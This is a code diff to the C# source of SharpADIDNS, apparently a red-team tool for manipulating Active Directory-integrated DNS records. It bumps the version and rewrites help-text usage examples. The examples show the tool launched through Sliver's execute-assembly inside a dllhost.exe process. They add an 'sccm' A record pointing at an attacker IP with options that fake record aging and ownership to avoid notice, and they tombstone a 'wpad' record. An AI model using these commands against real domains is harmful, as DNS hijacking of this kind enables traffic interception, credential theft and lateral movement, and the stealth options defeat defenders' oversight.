@@ -28,7 +28,7 @@ namespace SharpADIDNS
     // -----------------------------------------------------------------------
     internal static class Program
     {
-        public const string Version = "0.5.4";
+        public const string Version = "0.5.41";
 
         // Unique per process. All structured (JSON) output lines from this
         // invocation carry the same correlation_id, so an operator
@@ -2786,10 +2786,12 @@ namespace SharpADIDNS
             Console.WriteLine("      --data 10.0.0.66 --dn DC=redteamnotes,DC=local --ttl 60");
             Console.WriteLine();
             Console.WriteLine("  # Sliver execute-assembly recommended pattern");
-            Console.WriteLine("  SharpADIDNS.exe --c2 --username 'redteamnotes\\u' --password-base64 <b64> \\");
+            Console.WriteLine("  execute-assembly -p dllhost.exe SharpADIDNS.exe -- \\");
+            Console.WriteLine("      --c2 --username 'redteamnotes\\u' --password-base64 <b64> \\");
             Console.WriteLine("      --zone redteamnotes.local --dn DC=redteamnotes,DC=local --server dc.redteamnotes.local \\");
-            Console.WriteLine("      add --name sccm --type A --data 10.0.0.66 \\");
-            Console.WriteLine("          --mimic-aging --set-owner 'corp\\DnsAdmins'");
+            Console.WriteLine("      add \\");
+            Console.WriteLine("          --name sccm --type A --data 10.0.0.66 \\");
+            Console.WriteLine("          --mimic-aging --set-owner 'redteamnotes\\DnsAdmins'");
             Console.WriteLine();
             Console.WriteLine("  # Tombstone (soft delete; AD scavenges later)");
             Console.WriteLine("  SharpADIDNS.exe disable --zone redteamnotes.local --name wpad --dn DC=redteamnotes,DC=local");
